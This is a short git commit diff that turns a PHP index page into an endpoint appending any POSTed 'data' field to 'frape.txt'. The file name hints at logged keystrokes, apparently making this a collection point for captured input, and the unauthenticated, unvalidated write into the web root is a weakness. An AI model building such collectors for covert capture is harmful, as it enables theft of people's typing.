848d4fdc0ccf0201469387fd9a09132f986c3bc5
ainasoadylan5-wq <ainasoadylan5@gmail.com>
2026-04-08 20:35:44 +0300

    Update index.php

--- index.php
+++ index.php
@@ -1,3 +1,9 @@
 <?php
-echo "Serveur Render opérationnel";
+if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['data'])) {
+    $data = $_POST['data'];
+    file_put_contents("frape.txt", $data . "\n", FILE_APPEND);
+    echo "OK";
+} else {
+    echo "Serveur Render opérationnel - en attente de données POST";
+}
 ?>
